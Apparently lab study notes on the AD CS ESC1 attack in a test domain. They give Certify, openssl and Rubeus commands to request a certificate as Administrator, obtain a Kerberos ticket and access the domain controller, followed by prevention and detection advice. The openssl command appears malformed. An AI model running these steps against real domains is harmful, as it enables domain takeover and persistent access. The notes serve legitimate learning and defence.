Description:

  - Advantages of using certificates and compromising the Certificate Authority (CA):

    - Users and machines certificates are valid for 1+ years

    - Resetting a user password does not invalidate the certificate. With certificates, 
    it doesn't matter how many times a user changes their password; the certificate will
    still be valid (unless expired or revoked).

    - Misconfigured templates allow for obtaining a certificate for any user

    - Compromising the CA's private key results in forging Golden Certificates

  - These advantages make certificates the preferred method for long-term persistence.

  - ESC1:

    - Domain escalation via No Issuance Requirements + Enrollable Client Authentication/Smart
    Card Logon OID templates + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT


Attacks:

  - Utilize Certify https://github.com/GhostPack/Certify, to scan the environment for vulnerabilities 
  PKI infrastructure.

    .\Certify.exe find /vulnerable

  - We see the UserCert template is vulnerable

    .\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator

  - This will give us a PEM certificate that displays as base64 which needs to converted to PFX format

  - First run

    sed -i 's/\s\s\+/\n/g' cert.pem

  - Then run

    openssl pkcs -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export

  - Rubeus supports PFX so now we can request a kerberos TGT for the account Administrator and authenticate with the certificate

    .\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt

  - Can now list the contents of the C$ share on DC1

    dir \\dc1\c$


Prevention:

  - Attack would not be possible of the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag is not enabled in the 
  certificate template. 

  - Require CA certificate manager approval before issuing certificates, this will ensure that no certificates
  on potentially dangerous templates are issued without manual approval

  - Rgularly scan with Certify to find potential PKI issues


Detection:

  - When CA generates the cert. Event ID 4886 and 4887 will generate

  - Can use the certutil -view to dump everything on the CA with all the info about each certificate

  - Also will generate Event ID 4768
